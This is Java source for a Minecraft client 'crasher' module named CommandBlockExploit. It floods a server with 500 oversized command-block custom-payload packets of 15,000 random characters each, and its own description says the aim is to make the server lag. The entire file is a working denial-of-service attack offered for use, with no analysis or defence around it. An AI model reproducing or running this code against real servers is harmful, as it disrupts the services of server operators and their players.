package dev.isnow.puppy.exploit.impl.flood;

import dev.isnow.puppy.exploit.Exploit;
import dev.isnow.puppy.exploit.ExploitInfo;
import dev.isnow.puppy.exploit.ExploitType;
import dev.isnow.puppy.exploit.argument.Argument;
import dev.isnow.puppy.helper.ChatHelper;
import dev.isnow.puppy.helper.NetHelper;
import io.netty.buffer.Unpooled;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C17PacketCustomPayload;
import org.apache.commons.lang3.RandomStringUtils;

@ExploitInfo(
        name = "CommandBlock",
        type = ExploitType.FLOOD,
        description = "Simple crasher that lags the server while sending fuckton of commandblock packets"
)
public class CommandBlockExploit extends Exploit {

    public CommandBlockExploit() {
        super(new Argument("packets", 0, Integer.class));
    }

    @Override
    public void execute(Object... args) {
        long start = System.currentTimeMillis();

        ChatHelper.printMessage(
                String.format("Sending &8[&7Method: &7%s&7, Packets: &7%s&8]", getName(), args[0]));
        for (int i = 0; i < 500; i++) {
            PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
            buffer.writeString(RandomStringUtils.randomAlphabetic(15000));
            NetHelper.sendPacket(new C17PacketCustomPayload("MC|AdvCdm", buffer));
        }
        ChatHelper.printMessage(String.format("Sent &8[&7Method: &7%s&7, Time: &7%sms&8]", getName(),
                System.currentTimeMillis() - start));
    }
}